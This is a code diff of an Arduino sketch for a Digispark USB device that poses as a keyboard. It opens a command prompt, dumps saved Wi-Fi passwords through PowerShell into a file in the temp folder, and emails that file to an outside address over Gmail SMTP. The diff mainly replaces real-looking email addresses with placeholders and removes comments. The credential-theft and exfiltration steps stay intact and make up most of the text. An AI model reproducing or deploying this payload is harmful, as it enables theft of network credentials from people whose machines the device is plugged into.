@@ -15,7 +15,7 @@ void loop() {
   DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //start run
   DigiKeyboard.delay(1500);
-  DigiKeyboard.println("cmd"); //smallest cmd window possible for trying to making it as less noticeable as possible
+  DigiKeyboard.println("cmd");
   DigiKeyboard.delay(1500);
   DigiKeyboard.print(F("cd %temp%")); //Jumping to temporary dir 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -29,13 +29,13 @@ void loop() {
   DigiKeyboard.print(F("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt")); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);  
-  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_GMAIL_NAME_HERE', 'YOUR_GMAIL_APP_PASSWORD_HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'dominikefe2002@gmail.com'; $ReportEmail.To.Add('ali_efe0@outlook.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                                                                //enter example if your mail is example@gmail.com
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_GMAIL_NAME_HERE', 'YOUR_GMAIL_APP_PASSWORD_HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR_FULL_GMAIL_ADDRESS_HERE'; $ReportEmail.To.Add('DESTINATION_EMAIL_ADDRESS'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                                                                //enter example if your mail is example@gmail.com                                                                                     example@gmail.com
   DigiKeyboard.delay(2000);  
-  DigiKeyboard.print(F("exit")); //Jumping to temporary dir 
+  DigiKeyboard.print(F("exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("exit")); //Jumping to temporary dir 
+  DigiKeyboard.print(F("exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //start run
